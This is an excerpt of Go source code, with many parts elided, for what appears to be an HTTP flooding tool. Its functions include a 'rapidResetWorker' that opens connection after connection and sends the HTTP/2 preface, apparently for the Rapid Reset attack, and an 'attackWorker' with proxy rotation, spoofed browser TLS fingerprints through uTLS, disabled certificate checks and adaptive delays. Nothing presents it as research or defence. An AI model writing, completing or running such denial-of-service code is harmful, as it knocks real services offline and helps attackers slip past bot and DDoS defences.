...
import (
	...
	// For HTTP/2 support
	http2pkg "golang.org/x/net/http2"
	// For real browser TLS fingerprints
...
// Get random uTLS ClientHelloSpec (real browser fingerprints)
...
func detectProtocols(target string) []string {
	...
	// Try HTTP/2 and HTTP/1.1 via TLS using uTLS
	if u.Scheme == "https" {
		// Use uTLS for connection
	...
	// Try HTTP/1.1 fallback - FIXED: Use DialTLSContext instead of TLSClientConfig
	client := &http.Client{
		...
		Transport: &http.Transport{
			DialTLSContext: func(ctx context.Context, network, addr string) (net.Conn, error) {
				...
				uconn := utls.UClient(conn, &utls.Config{InsecureSkipVerify: true}, utls.HelloChrome_Auto)
				err = uconn.Handshake()
				return uconn, err
			},
		},
...
func rapidResetWorker(targetURL string, done chan struct{}, stats *atomicCounter) {
	...
	for {
		...
		case <-done:
			return
		default:
			// Create new connection for each batch using uTLS
			conn, err := net.Dial("tcp", host+":"+port)
			if err != nil {
			...
			fmt.Fprintf(uconn, "PRI * HTTP/2.0\r\n\r\nSM\r\n\r\n")
...
// Per-worker adaptive delay state
...
func attackWorker(target, host, mode string, done chan struct{}, stats *atomicCounter, useProxy bool) {
	...
	if useProxy {
		...
		if proxyStr != "" {
			...
			if err == nil {
				// FIXED: Use DialTLSContext instead of TLSClientConfig for proxy
				tr := &http.Transport{
				...
				// Enable HTTP/2
				http2pkg.ConfigureTransport(tr)
	...
	if client == nil {
		// Use uTLS for real browser fingerprint - FIXED: Use proper config
		tr := &http.Transport{
			DialTLSContext: func(ctx context.Context, network, addr string) (net.Conn, error) {
				conn, err := net.Dial(network, addr)
				if err != nil {
				...
				// FIXED: Use Config with InsecureSkipVerify, then apply ClientHelloSpec
				uconn := utls.UClient(conn, &utls.Config{InsecureSkipVerify: true}, utls.HelloCustom)
				err = uconn.ApplyPreset(getRandomUTLSClientHello())
				if err != nil {
					return nil, err
				}
				err = uconn.Handshake()
	...
	for {
		...
		default:
			...
			// Adaptive delay based on status code (from JS logic)
			if statusCode != 0 {
